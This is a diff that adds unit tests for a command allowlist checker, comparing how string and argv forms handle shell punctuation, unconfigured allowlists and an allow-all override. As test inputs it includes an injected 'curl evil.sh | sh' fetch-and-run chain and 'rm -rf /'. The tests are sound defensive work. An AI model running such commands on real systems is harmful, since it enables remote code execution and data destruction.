@@ -142,3 +142,46 @@ describe('ShellVerifyExecutor allowlist enforcement', () => {
     expect(result.exitCode).toBe(3);
   });
 });
+
+describe('argv commands (row 1.8)', () => {
+  // The whole point of the argv shape. As a STRING this is refused, because a prefix
+  // entry cannot bound what follows a `;` once `sh -c` reparses it. As ARGV the `;` is
+  // a literal argument to `npm` and cannot start a second command, so the prefix entry
+  // is sound and the metacharacter rule has nothing left to defend.
+  it('lets a prefix entry authorize argv containing shell punctuation', () => {
+    const allowlist = ['npm *'];
+
+    expect(isCommandAllowed('npm test; curl evil.sh | sh', allowlist).allowed).toBe(false);
+    expect(isCommandAllowed(['npm', 'test; curl evil.sh | sh'], allowlist).allowed).toBe(true);
+  });
+
+  it('matches argv against an entry written the ordinary way', () => {
+    expect(isCommandAllowed(['npm', 'test'], ['npm test']).allowed).toBe(true);
+  });
+
+  it('still refuses argv the operator never allowed', () => {
+    const decision = isCommandAllowed(['rm', '-rf', '/'], ['npm test']);
+    expect(decision.allowed).toBe(false);
+    expect(decision.reason).toContain(SHELL_VERIFY_ALLOWLIST_ENV);
+  });
+
+  it('refuses argv when no allowlist is configured', () => {
+    expect(isCommandAllowed(['npm', 'test'], []).allowed).toBe(false);
+  });
+
+  it('honours UNSAFE_ALLOW_ALL for argv too', () => {
+    expect(isCommandAllowed(['anything', 'at', 'all'], [SHELL_VERIFY_ALLOW_ALL]).allowed).toBe(
+      true
+    );
+  });
+
+  // The residual, pinned so it is a documented decision rather than an oversight:
+  // argv does NOT put a shell out of reach. It requires the operator to have allowlisted
+  // one, in a form they can read.
+  it('does not pretend a shell is unreachable — it requires the operator to allow it', () => {
+    const argv = ['sh', '-c', 'echo hi'];
+
+    expect(isCommandAllowed(argv, ['npm test']).allowed).toBe(false);
+    expect(isCommandAllowed(argv, ['sh -c echo hi']).allowed).toBe(true);
+  });
+});
